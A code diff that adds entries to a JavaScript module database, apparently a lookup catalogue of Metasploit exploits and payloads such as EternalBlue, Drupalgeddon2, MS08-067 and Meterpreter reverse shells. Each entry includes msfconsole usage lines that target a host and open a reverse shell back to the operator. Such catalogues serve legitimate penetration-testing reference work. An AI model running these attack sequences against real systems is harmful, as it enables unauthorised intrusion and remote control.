@@ -1206,5 +1206,105 @@ const MODULES_DB = [
         "options": [
             "FILENAME"
         ]
+    },
+    {
+        "name": "EternalBlue SMB Remote Code Execution",
+        "path": "exploit/windows/smb/ms17_010_eternalblue",
+        "category": "Exploit",
+        "description": "Exploit for CVE-2017-0144 EternalBlue SMB vulnerability",
+        "targets": ["Windows"],
+        "tags": ["eternalblue", "smb", "rce", "ms17-010", "exploit"],
+        "usage": "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target_ip\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST your_ip\nset LPORT 4444\nexploit",
+        "options": ["RHOSTS", "RPORT", "payload"]
+    },
+    {
+        "name": "Windows Meterpreter Reverse TCP",
+        "path": "payload/windows/meterpreter/reverse_tcp",
+        "category": "Payload",
+        "description": "Windows Meterpreter reverse TCP connection payload",
+        "targets": ["Windows"],
+        "tags": ["meterpreter", "reverse", "tcp", "windows", "payload"],
+        "usage": "set payload windows/meterpreter/reverse_tcp\nset LHOST your_ip\nset LPORT 4444",
+        "options": ["LHOST", "LPORT", "EXITFUNC"]
+    },
+    {
+        "name": "Linux x64 Meterpreter Reverse TCP",
+        "path": "payload/linux/x64/meterpreter/reverse_tcp",
+        "category": "Payload",
+        "description": "Linux x64 Meterpreter reverse TCP connection payload",
+        "targets": ["Linux"],
+        "tags": ["meterpreter", "reverse", "tcp", "linux", "x64", "payload"],
+        "usage": "set payload linux/x64/meterpreter/reverse_tcp\nset LHOST your_ip\nset LPORT 4444",
+        "options": ["LHOST", "LPORT", "PrependSetresuid", "PrependSetreuid"]
+    },
+    {
+        "name": "Apache Struts2 Content-Type RCE",
+        "path": "exploit/multi/http/struts2_content_type_ognl",
+        "category": "Exploit",
+        "description": "Apache Struts2 Content-Type OGNL injection RCE",
+        "targets": ["Linux", "Windows", "Any"],
+        "tags": ["struts2", "apache", "rce", "ognl", "http", "exploit"],
+        "usage": "use exploit/multi/http/struts2_content_type_ognl\nset RHOSTS target_ip\nset TARGETURI /struts2-showcase/\nset payload linux/x64/meterpreter/reverse_tcp\nset LHOST your_ip\nexploit",
+        "options": ["RHOSTS", "RPORT", "TARGETURI", "SSL"]
+    },
+    {
+        "name": "Drupal Drupalgeddon2 RCE",
+        "path": "exploit/unix/webapp/drupal_drupalgeddon2",
+        "category": "Exploit",
+        "description": "Drupal Drupalgeddon2 forms API property injection RCE",
+        "targets": ["Linux", "Unix"],
+        "tags": ["drupal", "drupalgeddon2", "rce", "webapp", "exploit"],
+        "usage": "use exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS target_ip\nset TARGETURI /\nset payload php/meterpreter/reverse_tcp\nset LHOST your_ip\nexploit",
+        "options": ["RHOSTS", "RPORT", "TARGETURI", "SSL"]
+    },
+    {
+        "name": "PHP Meterpreter Reverse TCP",
+        "path": "payload/php/meterpreter/reverse_tcp",
+        "category": "Payload",
+        "description": "PHP Meterpreter reverse TCP connection payload",
+        "targets": ["Linux", "Windows", "Any"],
+        "tags": ["php", "meterpreter", "reverse", "tcp", "payload"],
+        "usage": "set payload php/meterpreter/reverse_tcp\nset LHOST your_ip\nset LPORT 4444",
+        "options": ["LHOST", "LPORT"]
+    },
+    {
+        "name": "MS08-067 NetAPI Buffer Overflow",
+        "path": "exploit/windows/smb/ms08_067_netapi",
+        "category": "Exploit",
+        "description": "Microsoft Server Service Relative Path Stack Corruption",
+        "targets": ["Windows"],
+        "tags": ["ms08-067", "netapi", "smb", "buffer-overflow", "exploit"],
+        "usage": "use exploit/windows/smb/ms08_067_netapi\nset RHOSTS target_ip\nset payload windows/meterpreter/reverse_tcp\nset LHOST your_ip\nexploit",
+        "options": ["RHOSTS", "RPORT"]
+    },
+    {
+        "name": "Java Signed Applet Social Engineering",
+        "path": "exploit/multi/browser/java_signed_applet",
+        "category": "Exploit",
+        "description": "Java Signed Applet Social Engineering Code Execution",
+        "targets": ["Windows", "Linux", "Mac"],
+        "tags": ["java", "applet", "browser", "social-engineering", "exploit"],
+        "usage": "use exploit/multi/browser/java_signed_applet\nset SRVHOST your_ip\nset payload java/meterpreter/reverse_tcp\nset LHOST your_ip\nexploit",
+        "options": ["SRVHOST", "SRVPORT", "URIPATH"]
+    },
+    {
+        "name": "Windows Shell Reverse TCP",
+        "path": "payload/windows/shell/reverse_tcp",
+        "category": "Payload",
+        "description": "Windows command shell reverse TCP connection",
+        "targets": ["Windows"],
+        "tags": ["shell", "reverse", "tcp", "windows", "payload"],
+        "usage": "set payload windows/shell/reverse_tcp\nset LHOST your_ip\nset LPORT 4444",
+        "options": ["LHOST", "LPORT", "EXITFUNC"]
+    },
+    {
+        "name": "Linux Command Shell Reverse TCP",
+        "path": "payload/linux/x64/shell/reverse_tcp",
+        "category": "Payload",
+        "description": "Linux command shell reverse TCP connection",
+        "targets": ["Linux"],
+        "tags": ["shell", "reverse", "tcp", "linux", "payload"],
+        "usage": "set payload linux/x64/shell/reverse_tcp\nset LHOST your_ip\nset LPORT 4444",
+        "options": ["LHOST", "LPORT"]
     }
 ];
